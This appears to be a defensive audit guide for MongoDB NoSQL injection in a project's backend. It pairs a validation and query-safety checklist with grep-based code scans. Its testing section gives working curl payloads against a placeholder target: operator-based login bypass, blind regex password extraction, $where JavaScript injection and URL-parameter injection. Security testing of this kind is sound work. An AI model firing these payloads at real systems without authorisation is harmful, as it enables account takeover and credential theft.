# NoSQL Injection Audit (MongoDB)

Based on MITRE ATT&CK T1190, T1059.007 and OWASP Top 10 A03:2021.

## When to Use

- After adding new API endpoints that query MongoDB
- Before deployment to production
- When investigating database-related vulnerabilities

## Attacks to Test

### 1. Authentication Bypass via Operator Injection

```bash
# $ne operator - matches anything not equal
curl -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}'

# $gt operator - matches anything greater than empty string
curl -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# $regex operator - match specific user
curl -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'
```

### 2. Data Extraction via Blind Injection

```bash
# Extract password character by character
curl -X POST https://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^a"}}'
# If login succeeds, first char is 'a'
```

### 3. JavaScript Injection via $where

```bash
# Time-based detection
curl -X POST https://target/api/search \
  -H "Content-Type: application/json" \
  -d '{"$where": "sleep(5000) || this.username == \"admin\""}'
```

### 4. URL Parameter Injection

```bash
curl "https://target/api/users?username[$ne]=&password[$ne]="
curl "https://target/api/users?username[$regex]=admin&password[$gt]="
```

## Checklist

### Input Validation

- [ ] Reject objects where strings expected (check `typeof` in Mongoose validators)
- [ ] Reject MongoDB operators ($ne, $gt, $regex, $where, $exists) in user input
- [ ] Use Mongoose schema type validation (String, Number, etc.)
- [ ] Disable server-side JavaScript execution (`$where`) in MongoDB config

### Query Safety

- [ ] Use Mongoose parameterized queries
- [ ] No raw query objects from user input
- [ ] Use `.lean()` to prevent prototype pollution in queries
- [ ] Validate query operators against allowlist

### Authentication

- [ ] Login uses strict string comparison
- [ ] Password compared with `bcrypt.compare()`, not direct comparison
- [ ] User input sanitized before query construction

## Quick Scan

```bash
# Check for raw query objects from user input
grep -rn "\$where\|\$ne\|\$gt\|\$regex" apps/be/src/ --include="*.ts"

# Check for Mongoose schema validation
grep -rn "new Schema\|Schema(" apps/be/src/ --include="*.ts" | head -10

# Check for direct req.body in queries
grep -rn "req\.body" apps/be/src/ --include="*.ts" | head -20
```

## References

- Source: Anthropic-Cybersecurity-Skills `exploiting-nosql-injection-vulnerabilities`
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_NoSQL_Injection
